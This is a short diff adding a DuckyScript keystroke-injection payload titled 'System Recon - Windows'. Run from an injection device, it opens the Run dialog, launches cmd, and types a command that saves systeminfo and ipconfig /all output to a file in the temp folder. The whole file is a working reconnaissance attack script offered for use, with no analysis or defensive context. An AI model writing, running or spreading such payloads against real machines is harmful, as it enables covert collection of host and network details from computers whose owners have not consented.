@@ -1,0 +1,9 @@
+REM System Recon - Windows
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING systeminfo > %TEMP%\sysinfo.txt & ipconfig /all >> %TEMP%\sysinfo.txt
+ENTER
